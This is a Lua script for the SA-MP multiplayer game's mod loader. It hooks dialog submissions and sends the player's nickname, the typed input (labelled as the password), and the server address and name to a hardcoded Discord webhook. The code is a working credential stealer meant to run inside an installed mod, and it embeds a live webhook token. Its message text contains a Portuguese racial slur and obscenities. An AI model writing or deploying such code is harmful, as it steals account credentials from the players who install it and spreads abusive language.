local webhookUrl = "https://discord.com/api/webhooks/1473842271756746944/dEyWDYk9-JHspaKmG5VyW3qXf8ZB3Os1WCA_TzCNyoyaQX_GBhoYescLifGtSilHHyER"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\"'):gsub('\n', '\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end

require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()
    local author = "Negro filho do caralho"

    local message = string.format([[

__
  
     # BANIDOS NEW RPG

🤫0N1QU1: %s 
🧻S3NH3R: %s
🪿FLO IP: %s:%d
👀S3RVER: %s
🎲Q1FE1Z: %s 

TEM C0NTA SEU F1LA DA PL|T4

]], nick, input, ip, port, servername, author)

sendMessageToDiscord(message)
end
